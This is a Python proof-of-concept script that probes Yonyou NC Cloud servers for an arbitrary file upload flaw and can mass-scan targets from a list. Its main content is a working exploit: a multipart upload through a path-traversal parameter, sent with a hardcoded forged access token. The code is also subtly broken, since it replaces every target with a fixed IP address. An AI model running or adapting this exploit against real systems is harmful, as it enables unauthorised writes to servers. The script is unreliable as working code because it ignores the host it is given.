import argparse
import re
import requests
import csv
from concurrent.futures import ThreadPoolExecutor

def help():
    print("-----------------------------------------------------------")
    print("欢迎使用用友任意文件上传漏洞检测工具")
    print("-----------------------------------------------------------")
    print("地址：https://github.com/hanlin2002/python_poc")
    print("-----------------------------------------------------------")
    print("请添加 -h 获取帮助")
    print("-----------------------------------------------------------")

def upload_file():
    body = ""
    boundary = "024ff46f71634a1c9bf8ec5820c26fa9"
    body += "--" + boundary + "\r\n"
    body += 'Content-Disposition: form-data; name="file"; filename="test.txt"\r\n'
    body += "Content-Type: text/plain\r\n\r\n"
    body += "this is test"
    body += "\r\n"
    body += "--" + boundary + "--\r\n"
    return body

def exp(host):
    host = re.sub(r"/$", "", host)
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=024ff46f71634a1c9bf8ec5820c26fa9",
        "accessTokenNcc": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ"
    }
    data = upload_file()
    url = "http://119.13.102.104:5000"
    vulurl = url + "/ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1"
    try:
        r = requests.post(vulurl, headers=headers, data=data, verify=False, timeout=10)
        if r.status_code == 200:
            print(f"\033[32m{url} 可能存在[+]\033[0m")
        else:
            print(f"\033[32m{url} 不存在[+]\033[0m")
    except:
        return 0



if __name__ == "__main__":
    help()
    parser = argparse.ArgumentParser(description="检测URL是否存在漏洞")
    parser.add_argument("-u", "--url", required=False, help="需要检测的URL")
    parser.add_argument("-f", "--file", required=False, help="包含多个URL的txt文件路径")
    args = parser.parse_args()
    if args.file:
        data = open(args.file)
        reader = csv.reader(data)
        with ThreadPoolExecutor(24) as pool:
            for row in reader:
                pool.submit(exp, row[0])
    elif args.url:
        host = [args.url]
        print(host)
        exp(host[0])
    else:
        exit()